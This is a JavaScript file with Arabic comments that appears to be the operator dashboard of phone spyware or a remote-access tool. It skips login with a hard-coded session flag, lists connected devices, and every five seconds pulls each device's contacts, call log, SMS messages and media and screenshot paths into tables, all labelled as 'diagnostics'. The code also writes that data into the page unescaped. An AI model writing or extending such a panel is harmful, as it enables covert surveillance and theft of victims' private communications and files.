// تجاوز صفحة تسجيل الدخول والدخول للوحة مباشرة
sessionStorage.setItem('logged_in', 'true');

let currentDevice = null;
let updateInterval = null;
let dataInterval = null;
let soundPlayedForDevice = false;

// تسجيل الخروج
function logout() { 
    sessionStorage.removeItem('logged_in'); 
    window.location.href = 'index.html'; 
}

// تشغيل صوت تنبيه
function playNotificationSound() { 
    try { 
        const audio = new Audio('v.wav'); 
        audio.volume = 1.0; 
        audio.play(); 
    } catch (e) {} 
}

// تحميل الأجهزة المتصلة من السيرفر مباشرة
async function loadDevices() {
    try {
        const response = await fetch('/api/devices');
        const data = await response.json();
        const devices = data.devices || [];
        
        const select = document.getElementById('deviceSelect');
        const currentValue = currentDevice;
        select.innerHTML = '<option value="">اختر الجهاز للتحكم...</option>';
        
        devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.model || device.id;
            select.appendChild(option);
        });
        
        if (currentValue) { 
            select.value = currentValue; 
        } else if (devices.length > 0 && !currentDevice) { 
            selectDevice(devices[0].id); 
            select.value = devices[0].id; 
        }
    } catch (e) {}
}

// اختيار جهاز محدد
function selectDevice(deviceId) {
    currentDevice = deviceId;
    
    if (updateInterval) clearInterval(updateInterval);
    if (dataInterval) clearInterval(dataInterval);
    
    if (deviceId) {
        updateInterval = setInterval(updateLiveData, 5000);
        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 5000);
        updateLiveData();
        loadAllData();
    }
}

// تحديث حالة الاتصال والحياة
async function updateLiveData() {
    if (!currentDevice) return;
    try {
        const response = await fetch(`/api/diagnostics/${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        
        const statusEl = document.getElementById('netType');
        if (statusEl) {
            const pingData = data.diagnostics?.ping;
            if (pingData) {
                statusEl.textContent = 'متصل (Online)';
                statusEl.style.color = 'var(--green)';
            } else {
                statusEl.textContent = 'متصل عبر السيرفر';
                statusEl.style.color = 'var(--green)';
            }
        }
    } catch (e) {
        const statusEl = document.getElementById('netType');
        if (statusEl) {
            statusEl.textContent = 'غير متصل';
            statusEl.style.color = 'var(--red)';
        }
    }
}

// تحميل كافة بيانات الجهاز وعرضها في الجداول والوسائط
async function loadAllData() {
    if (!currentDevice) return;
    try {
        const response = await fetch(`/api/diagnostics/${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        const diag = data.diagnostics || {};

        // 1. جهات الاتصال (Contacts)
        if (diag.contacts && Array.isArray(diag.contacts.items)) {
            const tbody = document.querySelector('#contactsTable tbody');
            if (tbody) {
                tbody.innerHTML = '';
                diag.contacts.items.forEach(item => {
                    const parts = item.split(':');
                    const name = parts[0] || 'غير معروف';
                    const phone = parts.slice(1).join(':') || '';
                    tbody.innerHTML += `<tr><td>${name}</td><td>${phone}</td></tr>`;
                });
            }
        }

        // 2. سجل المكالمات (Calls)
        if (diag.calls && Array.isArray(diag.calls.items)) {
            const tbody = document.querySelector('#callsTable tbody');
            if (tbody) {
                tbody.innerHTML = '';
                diag.calls.items.forEach(item => {
                    tbody.innerHTML += `<tr><td>سجل مكالمة</td><td>${item}</td></tr>`;
                });
            }
        }

        // 3. الرسائل القصيرة (SMS)
        if (diag.messages && Array.isArray(diag.messages.items)) {
            const tbody = document.querySelector('#messagesTable tbody');
            if (tbody) {
                tbody.innerHTML = '';
                diag.messages.items.forEach(item => {
                    tbody.innerHTML += `<tr><td>رسالة نصية</td><td>${item}</td></tr>`;
                });
            }
        }

        // 4. معرض الصور والوسائط (Media / Camera / Screenshots)
        if (diag.media && Array.isArray(diag.media.items)) {
            const studioGallery = document.getElementById('studioGallery');
            const screenshotsGallery = document.getElementById('screenshotsGallery');
            
            if (studioGallery) studioGallery.innerHTML = '';
            if (screenshotsGallery) screenshotsGallery.innerHTML = '';

            diag.media.items.forEach(filePath => {
                const card = `<div class="gallery-item">
                    <div style="width:100%; height:110px; background:#111; display:flex; align-items:center; justify-content:center; color:var(--green); font-size:11px; text-align:center; padding:5px; word-break:break-all;">📁 مسار الملف</div>
                    <span style="font-size:10px; color:var(--muted); margin:4px 0; word-break:break-all; max-width:100%;">${filePath}</span>
                </div>`;
                
                if (filePath.includes('Screenshots')) {
                    if (screenshotsGallery) screenshotsGallery.innerHTML += card;
                } else {
                    if (studioGallery) studioGallery.innerHTML += card;
                }
            });
        }

    } catch (e) {}
}

// تبديل التبويبات في القائمة الجانبية
function switchTab(tabName) {
    document.querySelectorAll('.menu-btn').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    
    const activeBtn = document.querySelector(`[onclick="switchTab('${tabName}')"]`);
    if (activeBtn) activeBtn.classList.add('active');
    
    const pane = document.getElementById(`${tabName}Tab`);
    if (pane) pane.classList.add('active');
}

// التهيئة والتشغيل التلقائي
loadDevices();
setInterval(loadDevices, 10000);
